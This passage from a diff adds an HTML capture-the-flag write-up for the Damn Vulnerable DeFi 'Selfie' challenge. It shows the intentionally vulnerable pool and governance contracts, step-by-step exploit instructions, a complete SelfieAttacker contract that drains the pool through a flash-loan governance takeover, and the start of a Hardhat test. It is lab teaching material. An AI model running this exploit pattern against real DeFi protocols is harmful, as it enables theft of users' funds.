+        <span class="n">governance</span> <span class="o">=</span> <span class="n">SimpleGovernance</span><span class="p">(</span><span class="n">_governance</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">maxFlashLoan</span><span class="p">(</span><span class="n">address</span> <span class="n">_token</span><span class="p">)</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">==</span> <span class="n">_token</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">token</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">));</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">flashFee</span><span class="p">(</span><span class="n">address</span> <span class="n">_token</span><span class="p">,</span> <span class="n">uint256</span><span class="p">)</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="n">_token</span><span class="p">)</span>
+            <span class="n">revert</span> <span class="n">UnsupportedCurrency</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">flashLoan</span><span class="p">(</span>
+        <span class="n">IERC3156FlashBorrower</span> <span class="n">_receiver</span><span class="p">,</span>
+        <span class="n">address</span> <span class="n">_token</span><span class="p">,</span>
+        <span class="n">uint256</span> <span class="n">_amount</span><span class="p">,</span>
+        <span class="nb">bytes</span> <span class="n">calldata</span> <span class="n">_data</span>
+    <span class="p">)</span> <span class="n">external</span> <span class="n">nonReentrant</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">_token</span> <span class="o">!=</span> <span class="n">address</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
+            <span class="n">revert</span> <span class="n">UnsupportedCurrency</span><span class="p">();</span>
+
+        <span class="n">token</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">_receiver</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">_receiver</span><span class="o">.</span><span class="n">onFlashLoan</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">_token</span><span class="p">,</span> <span class="n">_amount</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_data</span><span class="p">)</span> <span class="o">!=</span> <span class="n">CALLBACK_SUCCESS</span><span class="p">)</span>
+            <span class="n">revert</span> <span class="n">CallbackFailed</span><span class="p">();</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">token</span><span class="o">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">_receiver</span><span class="p">),</span> <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">),</span> <span class="n">_amount</span><span class="p">))</span>
+            <span class="n">revert</span> <span class="n">RepayFailed</span><span class="p">();</span>
+
+        <span class="k">return</span> <span class="n">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">emergencyExit</span><span class="p">(</span><span class="n">address</span> <span class="n">receiver</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlyGovernance</span> <span class="p">{</span>
+        <span class="n">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">));</span>
+        <span class="n">token</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+
+        <span class="n">emit</span> <span class="n">FundsDrained</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>SimpleGovernance.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;../DamnValuableTokenSnapshot.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;./ISimpleGovernance.sol&quot;</span>
+<span class="p">;</span>
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="nd">@title</span> <span class="n">SimpleGovernance</span>
+ <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
+ <span class="o">*/</span>
+<span class="n">contract</span> <span class="n">SimpleGovernance</span> <span class="ow">is</span> <span class="n">ISimpleGovernance</span> <span class="p">{</span>
+
+    <span class="n">uint256</span> <span class="n">private</span> <span class="n">constant</span> <span class="n">ACTION_DELAY_IN_SECONDS</span> <span class="o">=</span> <span class="mi">2</span> <span class="n">days</span><span class="p">;</span>
+    <span class="n">DamnValuableTokenSnapshot</span> <span class="n">private</span> <span class="n">_governanceToken</span><span class="p">;</span>
+    <span class="n">uint256</span> <span class="n">private</span> <span class="n">_actionCounter</span><span class="p">;</span>
+    <span class="n">mapping</span><span class="p">(</span><span class="n">uint256</span> <span class="o">=&gt;</span> <span class="n">GovernanceAction</span><span class="p">)</span> <span class="n">private</span> <span class="n">_actions</span><span class="p">;</span>
+
+    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">governanceToken</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_governanceToken</span> <span class="o">=</span> <span class="n">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="n">governanceToken</span><span class="p">);</span>
+        <span class="n">_actionCounter</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">queueAction</span><span class="p">(</span><span class="n">address</span> <span class="n">target</span><span class="p">,</span> <span class="n">uint128</span> <span class="n">value</span><span class="p">,</span> <span class="nb">bytes</span> <span class="n">calldata</span> <span class="n">data</span><span class="p">)</span> <span class="n">external</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span> <span class="n">actionId</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">_hasEnoughVotes</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">))</span>
+            <span class="n">revert</span> <span class="n">NotEnoughVotes</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">))</span>
+            <span class="n">revert</span> <span class="n">InvalidTarget</span><span class="p">();</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">target</span><span class="o">.</span><span class="n">code</span><span class="o">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">revert</span> <span class="n">TargetMustHaveCode</span><span class="p">();</span>
+
+        <span class="n">actionId</span> <span class="o">=</span> <span class="n">_actionCounter</span><span class="p">;</span>
+
+        <span class="n">_actions</span><span class="p">[</span><span class="n">actionId</span><span class="p">]</span> <span class="o">=</span> <span class="n">GovernanceAction</span><span class="p">({</span>
+            <span class="n">target</span><span class="p">:</span> <span class="n">target</span><span class="p">,</span>
+            <span class="n">value</span><span class="p">:</span> <span class="n">value</span><span class="p">,</span>
+            <span class="n">proposedAt</span><span class="p">:</span> <span class="n">uint64</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">),</span>
+            <span class="n">executedAt</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="n">data</span><span class="p">:</span> <span class="n">data</span>
+        <span class="p">});</span>
+
+        <span class="n">unchecked</span> <span class="p">{</span> <span class="n">_actionCounter</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
+
+        <span class="n">emit</span> <span class="n">ActionQueued</span><span class="p">(</span><span class="n">actionId</span><span class="p">,</span> <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">executeAction</span><span class="p">(</span><span class="n">uint256</span> <span class="n">actionId</span><span class="p">)</span> <span class="n">external</span> <span class="n">payable</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bytes</span> <span class="n">memory</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">_canBeExecuted</span><span class="p">(</span><span class="n">actionId</span><span class="p">))</span>
+            <span class="n">revert</span> <span class="n">CannotExecute</span><span class="p">(</span><span class="n">actionId</span><span class="p">);</span>
+
+        <span class="n">GovernanceAction</span> <span class="n">storage</span> <span class="n">actionToExecute</span> <span class="o">=</span> <span class="n">_actions</span><span class="p">[</span><span class="n">actionId</span><span class="p">];</span>
+        <span class="n">actionToExecute</span><span class="o">.</span><span class="n">executedAt</span> <span class="o">=</span> <span class="n">uint64</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">);</span>
+
+        <span class="n">emit</span> <span class="n">ActionExecuted</span><span class="p">(</span><span class="n">actionId</span><span class="p">,</span> <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">);</span>
+
+        <span class="p">(</span><span class="nb">bool</span> <span class="n">success</span><span class="p">,</span> <span class="nb">bytes</span> <span class="n">memory</span> <span class="n">returndata</span><span class="p">)</span> <span class="o">=</span> <span class="n">actionToExecute</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">call</span><span class="p">{</span><span class="n">value</span><span class="p">:</span> <span class="n">actionToExecute</span><span class="o">.</span><span class="n">value</span><span class="p">}(</span><span class="n">actionToExecute</span><span class="o">.</span><span class="n">data</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">success</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">returndata</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">assembly</span> <span class="p">{</span>
+                    <span class="n">revert</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">returndata</span><span class="p">),</span> <span class="n">mload</span><span class="p">(</span><span class="n">returndata</span><span class="p">))</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="n">revert</span> <span class="n">ActionFailed</span><span class="p">(</span><span class="n">actionId</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">returndata</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">getActionDelay</span><span class="p">()</span> <span class="n">external</span> <span class="n">pure</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">ACTION_DELAY_IN_SECONDS</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">getGovernanceToken</span><span class="p">()</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">address</span><span class="p">(</span><span class="n">_governanceToken</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">getAction</span><span class="p">(</span><span class="n">uint256</span> <span class="n">actionId</span><span class="p">)</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">GovernanceAction</span> <span class="n">memory</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">_actions</span><span class="p">[</span><span class="n">actionId</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">getActionCounter</span><span class="p">()</span> <span class="n">external</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">_actionCounter</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="o">/**</span>
+     <span class="o">*</span> <span class="nd">@dev</span> <span class="n">an</span> <span class="n">action</span> <span class="n">can</span> <span class="n">only</span> <span class="n">be</span> <span class="n">executed</span> <span class="k">if</span><span class="p">:</span>
+     <span class="o">*</span> <span class="mi">1</span><span class="p">)</span> <span class="n">it</span><span class="s1">&#39;s never been executed before and</span>
+     <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="n">enough</span> <span class="n">time</span> <span class="n">has</span> <span class="n">passed</span> <span class="n">since</span> <span class="n">it</span> <span class="n">was</span> <span class="n">first</span> <span class="n">proposed</span>
+     <span class="o">*/</span>
+    <span class="n">function</span> <span class="n">_canBeExecuted</span><span class="p">(</span><span class="n">uint256</span> <span class="n">actionId</span><span class="p">)</span> <span class="n">private</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">GovernanceAction</span> <span class="n">memory</span> <span class="n">actionToExecute</span> <span class="o">=</span> <span class="n">_actions</span><span class="p">[</span><span class="n">actionId</span><span class="p">];</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">actionToExecute</span><span class="o">.</span><span class="n">proposedAt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">//</span> <span class="n">early</span> <span class="n">exit</span>
+            <span class="k">return</span> <span class="n">false</span><span class="p">;</span>
+
+        <span class="n">uint64</span> <span class="n">timeDelta</span><span class="p">;</span>
+        <span class="n">unchecked</span> <span class="p">{</span>
+            <span class="n">timeDelta</span> <span class="o">=</span> <span class="n">uint64</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span><span class="p">)</span> <span class="o">-</span> <span class="n">actionToExecute</span><span class="o">.</span><span class="n">proposedAt</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">actionToExecute</span><span class="o">.</span><span class="n">executedAt</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">timeDelta</span> <span class="o">&gt;=</span> <span class="n">ACTION_DELAY_IN_SECONDS</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">_hasEnoughVotes</span><span class="p">(</span><span class="n">address</span> <span class="n">who</span><span class="p">)</span> <span class="n">private</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="nb">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">uint256</span> <span class="n">balance</span> <span class="o">=</span> <span class="n">_governanceToken</span><span class="o">.</span><span class="n">getBalanceAtLastSnapshot</span><span class="p">(</span><span class="n">who</span><span class="p">);</span>
+        <span class="n">uint256</span> <span class="n">halfTotalSupply</span> <span class="o">=</span> <span class="n">_governanceToken</span><span class="o">.</span><span class="n">getTotalSupplyAtLastSnapshot</span><span class="p">()</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="k">return</span> <span class="n">balance</span> <span class="o">&gt;</span> <span class="n">halfTotalSupply</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2 id="goal">Goal</h2>
+<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</p>
+<h2 id="exploit">Exploit</h2>
+<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p>
+<p>The vulnerable part of the code is located in the SelfiePool contract, inside the emergencyExit, the problem is that we can bypass the onlyGovernance modifier and transfer all the DVT tokens from the SelfiePool to our address.</p>
+<p>To explout the selfie pool we need to:</p>
+<ol>
+<li>create Attacker contract, this contract will be borrowing the flash loan from the SelfiePool, therefore it needs to implement the onFlashLoan() function from IERC3156FlashBorrower. We need to have instances of of the SimpleGovernance, SelfiePool and the DamnValuableTokenSnapshot contracts</li>
+<li>
+<p>implement onFlashLoan() function, inside this function we will:
+<br />
+<ul>
+  <li>call the snapshot function from the DamnValuableTokenSnapshot token contract, we need this in order to snapshot that the borrowed tokens are in posession of the Attacker contract now</li>
+  <li>call the queueAction() function from SimpleGovernance pool, and send abi.encodeWithSignature("emergencyExit(address)", address(this)) as a argument for the data parameter, this way we will call the emergencyExit() function from the SimpleGovernance contract</li>
+  <li>approve the DamnValuableTokenSnapshot token contract to use the borrowed tokens, this is needed in order to repay the loan</li>
+  </ul></p>
+</li>
+<li>
+<p>create executeFlashLoan() external function, inside this function we will call flashLoan function from the SelfiePool contract</p>
+</li>
+<li>create executeAction() external function, inside this function we will call executeAction() function from the SimpleGovernance contract, and after that it will transfer the DVT tokens from the Attacker contract to our EOA</li>
+<li>create instance from the Attacker contract</li>
+<li>call executeFlashLoan from the Attacker contract</li>
+<li>increase evm time for 2 days, await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days</li>
+<li>call executeAction from the attacker contract</li>
+</ol>
+<h2 id="attacker-contract-code">Attacker contract code</h2>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;./SelfiePool.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;./ISimpleGovernance.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;../DamnValuableTokenSnapshot.sol&quot;</span><span class="p">;</span>
+
+<span class="n">contract</span> <span class="n">SelfieAttacker</span> <span class="ow">is</span> <span class="n">IERC3156FlashBorrower</span> <span class="p">{</span>
+    <span class="n">address</span> <span class="n">private</span> <span class="n">immutable</span> <span class="n">governance</span><span class="p">;</span>
+    <span class="n">SelfiePool</span> <span class="n">private</span> <span class="n">immutable</span> <span class="n">pool</span><span class="p">;</span>
+    <span class="n">DamnValuableTokenSnapshot</span> <span class="n">private</span> <span class="n">governanceToken</span><span class="p">;</span>
+
+    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">_governance</span><span class="p">,</span> <span class="n">SelfiePool</span> <span class="n">_pool</span><span class="p">,</span> <span class="n">address</span> <span class="n">_token</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">governance</span> <span class="o">=</span> <span class="n">_governance</span><span class="p">;</span>
+        <span class="n">pool</span> <span class="o">=</span> <span class="n">SelfiePool</span><span class="p">(</span><span class="n">_pool</span><span class="p">);</span>
+        <span class="n">governanceToken</span> <span class="o">=</span> <span class="n">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="n">_token</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">onFlashLoan</span><span class="p">(</span>
+        <span class="n">address</span><span class="p">,</span>
+        <span class="n">address</span> <span class="n">token</span><span class="p">,</span>
+        <span class="n">uint256</span> <span class="n">amount</span><span class="p">,</span>
+        <span class="n">uint256</span> <span class="n">fee</span><span class="p">,</span>
+        <span class="nb">bytes</span> <span class="n">calldata</span>
+    <span class="p">)</span> <span class="n">external</span> <span class="n">override</span> <span class="n">returns</span> <span class="p">(</span><span class="n">bytes32</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">uint</span> <span class="n">snapshotId</span> <span class="o">=</span> <span class="n">governanceToken</span><span class="o">.</span><span class="n">snapshot</span><span class="p">();</span>
+
+        <span class="n">ISimpleGovernance</span><span class="p">(</span><span class="n">governance</span><span class="p">)</span><span class="o">.</span><span class="n">queueAction</span><span class="p">(</span>
+            <span class="n">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span>
+            <span class="mi">0</span><span class="p">,</span>
+            <span class="n">abi</span><span class="o">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;emergencyExit(address)&quot;</span><span class="p">,</span> <span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">))</span>
+        <span class="p">);</span>
+
+        <span class="n">governanceToken</span><span class="o">.</span><span class="n">approve</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+
+
+        <span class="k">return</span> <span class="n">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">executeFlashLoan</span><span class="p">()</span> <span class="n">external</span> <span class="p">{</span>
+        <span class="n">pool</span><span class="o">.</span><span class="n">flashLoan</span><span class="p">(</span>
+            <span class="n">IERC3156FlashBorrower</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">)),</span>
+            <span class="n">address</span><span class="p">(</span><span class="n">governanceToken</span><span class="p">),</span>
+            <span class="n">governanceToken</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">pool</span><span class="p">)),</span>
+            <span class="s2">&quot;&quot;</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">executeAction</span><span class="p">()</span> <span class="n">external</span> <span class="p">{</span>
+        <span class="n">ISimpleGovernance</span><span class="p">(</span><span class="n">governance</span><span class="p">)</span><span class="o">.</span><span class="n">executeAction</span><span class="p">{</span><span class="n">value</span><span class="p">:</span> <span class="mi">0</span><span class="p">}(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">governanceToken</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span>
+            <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span>
+            <span class="n">governanceToken</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">))</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2 id="solution-code">Solution code</h2>
+<div class="codehilite"><pre><span></span><code><span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">ethers</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;hardhat&#39;</span><span class="p">);</span>
+<span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">expect</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="s1">&#39;chai&#39;</span><span class="p">);</span>
+<span class="n">const</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="nc">time</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">require</span><span class="p">(</span><span class="ss">&quot;@nomicfoundation/hardhat-network-helpers&quot;</span><span class="p">);</span>
+
+<span class="k">describe</span><span class="p">(</span><span class="s1">&#39;[Challenge] Selfie&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">deployer</span><span class="p">,</span><span class="w"> </span><span class="n">player</span><span class="p">;</span>
+<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">token</span><span class="p">,</span><span class="w"> </span><span class="n">governance</span><span class="p">,</span><span class="w"> </span><span class="n">pool</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">TOKEN_INITIAL_SUPPLY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2000000</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18</span><span class="n">n</span><span class="p">;</span>
+<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">TOKENS_IN_POOL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1500000</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="n">n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18</span><span class="n">n</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">before</span><span class="p">(</span><span class="n">async</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="cm">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>
+<span class="w">        </span><span class="o">[</span><span class="n">deployer, player</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getSigners</span><span class="p">();</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Deploy</span><span class="w"> </span><span class="n">Damn</span><span class="w"> </span><span class="n">Valuable</span><span class="w"> </span><span class="n">Token</span><span class="w"> </span><span class="n">Snapshot</span>
+<span class="w">        </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;DamnValuableTokenSnapshot&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">)).</span><span class="n">deploy</span><span class="p">(</span><span class="n">TOKEN_INITIAL_SUPPLY</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Deploy</span><span class="w"> </span><span class="n">governance</span><span class="w"> </span><span class="n">contract</span>
+<span class="w">        </span><span class="n">governance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;SimpleGovernance&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">)).</span><span class="n">deploy</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">governance</span><span class="p">.</span><span class="n">getActionCounter</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Deploy</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">pool</span>
+<span class="w">        </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">await</span><span class="w"> </span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">ethers</span><span class="p">.</span><span class="n">getContractFactory</span><span class="p">(</span><span class="s1">&#39;SelfiePool&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">deployer</span><span class="p">)).</span><span class="n">deploy</span><span class="p">(</span>
+<span class="w">            </span><span class="n">token</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
+<span class="w">            </span><span class="n">governance</span><span class="p">.</span><span class="n">address</span><span class="w">    </span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="n">token</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+<span class="w">        </span><span class="n">expect</span><span class="p">(</span><span class="n">await</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="n">governance</span><span class="p">()).</span><span class="k">to</span><span class="p">.</span><span class="n">eq</span><span class="p">(</span><span class="n">governance</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+
+<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Fund</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">pool</span>
